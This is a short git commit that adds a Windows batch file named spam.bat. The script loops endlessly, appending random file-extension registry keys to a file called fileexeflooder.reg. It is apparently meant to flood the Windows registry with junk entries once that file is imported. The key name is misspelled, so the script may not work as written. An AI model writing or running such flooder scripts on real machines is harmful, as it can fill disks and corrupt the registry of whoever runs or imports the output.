893fc97e15d2ee14031dc85fecc72171554386b4
jtrent238 <jtrent238@outlook.com>
2015-09-05 12:31:56 -0400

    Create spam.bat

---
+++ spam.bat
@@ -0,0 +1,11 @@
+@echo off
+cls
+echo Windows Registry Editor Version 5.00>fileexeflooder.reg
+:x //loop variable
+color 0a
+cls
+echo [HKEY_CLASS_ROOT\.%random%]>>fileexeflooder.reg
+cls
+cls
+goto x // infinite loop
+cls
